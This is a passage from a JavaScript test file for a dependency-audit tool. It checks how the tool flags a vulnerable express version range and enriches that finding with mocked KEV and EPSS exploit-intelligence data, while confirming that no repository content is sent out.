  const express = advised.findings.find(item => item.detail && item.detail.package === 'express');
  assert.strictEqual(express.rule, 'DEP-005', 'the lowest version ^4.19.0 accepts is affected; 4.20.0 is inside the range');
  assert.strictEqual(express.detail.range, '^4.19.0');
  assert.deepStrictEqual(advised.coverage.advisories, { versions: 2, checked: 2, unknown: 0, notChecked: 0, vulnerable: 1, malicious: 0, lockfiles: 1, lockfilesRead: 1, setAside: 0 });
  assert.strictEqual(advised.coverage.exploit, null, 'without an exploit source, nothing is claimed about exploitation');

  /* With exploit intelligence: only the advisory's CVE leaves, after the advisories, as its own stage. */
  const stages = [];
  const intelAsked = [];
  const { createIntelCache, KEV_URL } = require('../src/exploit-intel');
  const intelTransport = async input => {
    intelAsked.push(input);
    if (input.url === KEV_URL) return { statusCode: 200, body: JSON.stringify({ catalogVersion: '2026.09.27', vulnerabilities: [{ cveID: 'CVE-2024-43796', dateAdded: '2026-01-02', dueDate: '2026-01-23', knownRansomwareCampaignUse: 'Unknown' }] }) };
    return { statusCode: 200, body: JSON.stringify({ data: [{ cve: 'CVE-2024-43796', epss: '0.00120', percentile: '0.31', date: '2026-09-28' }] }) };
  };
  const informed = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null, registryTransport, advisoryTransport,
    intelTransport, intelCache: createIntelCache(), onProgress: update => stages.push(update.stage) });
  assert.deepStrictEqual([...new Set(stages)], ['resolving', 'reading', 'advisories', 'intel', 'analysing']);
  assert(intelAsked.every(input => input.profile === 'threat-intel' && input.method === 'GET'));
  assert(intelAsked.every(input => !/server\.js|expresss|README/.test(input.url)), 'nothing from the repository leaves');
  assert.deepStrictEqual(informed.coverage.exploit, { cves: 1, asked: 1, kev: 'ok', kevVersion: '2026.09.27', kevCount: 1, kevStale: false, epss: 'ok', scored: 1, unscored: 0 });
  const informedExpress = informed.findings.find(item => item.detail && item.detail.package === 'express');
  assert.strictEqual(informedExpress.detail.intel.exploited, true);
  assert.strictEqual(informedExpress.rule, 'DEP-005');
  assert.notStrictEqual(informed.capReason, 'exploited', 'a range that already admits the fix is not held down as exploited');

  console.log('code audit tests passed');
})().catch(error => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
